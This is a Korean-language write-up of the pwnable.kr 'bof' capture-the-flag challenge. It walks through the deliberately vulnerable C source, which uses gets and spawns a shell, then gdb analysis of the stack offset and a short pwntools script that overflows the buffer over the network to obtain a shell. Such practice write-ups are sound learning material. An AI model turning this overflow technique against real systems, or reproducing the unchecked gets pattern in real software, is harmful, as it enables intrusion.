# [pwnable.kr] bof문제 writeup

---

![Untitled](/3%EC%A3%BC%EC%B0%A8/Pwnable.kr%20BOF/%5Bpwnable%20kr%5D%20bof%20writeup/Untitled.png)

리눅스에 wget명령어로 bof파일을 받아서 gdb-gef를 사용하여 디버깅 해보았다.

![스택에 0xdeadbeef를 넣어주고 func라는 함수를 실행한다.](/3%EC%A3%BC%EC%B0%A8/Pwnable.kr%20BOF/%5Bpwnable%20kr%5D%20bof%20writeup/Untitled%201.png)

스택에 0xdeadbeef를 넣어주고 func라는 함수를 실행한다.

한번 func 함수를 disas 명령어로 확인해보자

![Untitled](/3%EC%A3%BC%EC%B0%A8/Pwnable.kr%20BOF/%5Bpwnable%20kr%5D%20bof%20writeup/Untitled%202.png)

24번째, 35번째 줄에서 함수를 호출하고(어떤 함수인지는 아직 모름) cmp부분에서 0 xcafebabe랑 비교하는 걸 볼 수 있다.

한번 c언어 코드도 보자

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);    // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

c언어의 func함수 코드를 보니 대충감이 왔다.

어셈블리에서 24번째 줄에서 호출한 함수는 printf함수고, 35번째 줄에서 호출하는 함수는 gets함수다.

bof문제이기 때문에 gets에서 오버플로우를 발생시켜서 if부분에 key값을 조작하면 해결될 거 같다.

gets에서 내가 입력한 문자열이랑 key에 들어있는 0 xdeadbeef값이 얼마나 떨어져 있는지 알아내기 위해서 gdb에서 func+40(gets함수 바로 다음 부분)에 브레이크 포인트를 걸고 실행시켜보았다.

aaaa를 입력했다.

![브레이크 포인트에 멈춘 상태](/3%EC%A3%BC%EC%B0%A8/Pwnable.kr%20BOF/%5Bpwnable%20kr%5D%20bof%20writeup/Untitled%203.png)

브레이크 포인트에 멈춘 상태

![Untitled](/3%EC%A3%BC%EC%B0%A8/Pwnable.kr%20BOF/%5Bpwnable%20kr%5D%20bof%20writeup/Untitled%204.png)

find 명령어로 입력한 값이 저장된 위치를 찾았다.

내가 입력한 0x61616161(aaaa)로부터 0 xdeadbeef가 얼마큼 떨어져 있는지 알아내기 위해 x/20wx 0 xffffd2 dc 명령어를 사용했다

![gets로 받는 부분부터 13만큼 떨어져있다](/3%EC%A3%BC%EC%B0%A8/Pwnable.kr%20BOF/%5Bpwnable%20kr%5D%20bof%20writeup/Untitled%205.png)

gets로 받는 부분부터 13만큼 떨어져있다

aaaa를 넣었을 때 한 칸이 0x61616161로 찼으니까 총 4x13=52만큼 문자를 입력하고 0 xcafebabe를 입력하면 조작할 수가 있다.

---

<aside>
💡 **추가내용**

</aside>

> 찾아보니 pwndbg에 더 편한 기능이 있었다. distance라는 명령어인데 각 값의 주소를 입력해주면 오프셋를 구해준다.
> 

![각 값의 주소를 구해주고](/3%EC%A3%BC%EC%B0%A8/Pwnable.kr%20BOF/%5Bpwnable%20kr%5D%20bof%20writeup/Untitled%206.png)

각 값의 주소를 구해주고

![명령어를 사용하면](/3%EC%A3%BC%EC%B0%A8/Pwnable.kr%20BOF/%5Bpwnable%20kr%5D%20bof%20writeup/Untitled%207.png)

명령어를 사용하면

0x34(10진수로 52) 바이트만큼 떨어져 있다고 나온다.

---

## Exploit

```python
from pwn import *

p = remote("pwnable.kr", 9000)

payload = b'a'*52

payload += p32(0xcafebabe)

p.sendline(payload)
p.interactive()
```

4번째 줄에서는 사이트에 나와있는 nc의 주소로 접속하게 해주는 코드이다. 

첫 번째 gets에서 오버플로우를 발생시켜야 하기 때문에 페이로드를 한 문자열로 끝내야 한다.

6번째 줄에서 위에서 설명한 대로 52만큼 문자를 입력해준다.

그리고 0 xcafebabe를 추가해줘야 하는데 여기가 중요하다.

### 32비트 프로그램은 리틀 엔디안 방식으로 데이터를 저장한다.

> 간단하게 설명하자면 0x12345678을 리틀 엔디안 방식으로 저장한다고 하면 78,56,34,12 이런 식으로 순서가 뒤바뀐다. 이 부분에 대해서는 개인 공부를 더해보길 바란다.
> 

앞에 52개의 문자는 더미 데이터라서 순서가 상관없었지만 0 xcafebabe는 순서가 정확해야 cmp부분을 통과할 수가 있다. pwntools에는 p32()라는 아주 좋은 함수가 있다. p32()는 값을 32비트인 리틀 엔디안 방식으로 알아서 패킹해준다.

이제 완성된 페이로드를 p.sendline으로 자동 입력이 되게 하고, p.interactive로 내가 직접 상호작용 할 수 있게 하면 완성이다. 한번 실행시켜보자.

![플래그를 읽을 수 있었다](/3%EC%A3%BC%EC%B0%A8/Pwnable.kr%20BOF/%5Bpwnable%20kr%5D%20bof%20writeup/Untitled%208.png)

플래그를 읽을 수 있었다